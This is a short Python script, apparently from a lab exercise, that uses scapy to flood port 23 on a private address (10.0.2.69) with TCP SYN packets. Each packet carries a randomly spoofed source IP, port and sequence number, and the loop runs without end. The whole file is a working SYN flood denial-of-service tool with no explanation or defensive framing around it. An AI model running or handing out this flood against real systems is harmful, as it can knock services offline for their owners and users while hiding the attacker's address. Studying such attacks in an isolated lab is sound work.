from ipaddress import IPv4Address
from random import getrandbits

from scapy.all import IP, TCP, send

ip = IP(dst="10.0.2.69")  # Destination IP
tcp = TCP(dport=23, flags="S")  # Telnet
pkt = ip / tcp

while True:
    pkt[IP].src = str(IPv4Address(getrandbits(32)))
    pkt[TCP].sport = getrandbits(16)
    pkt[TCP].seq = getrandbits(32)
    send(pkt, verbose=0)
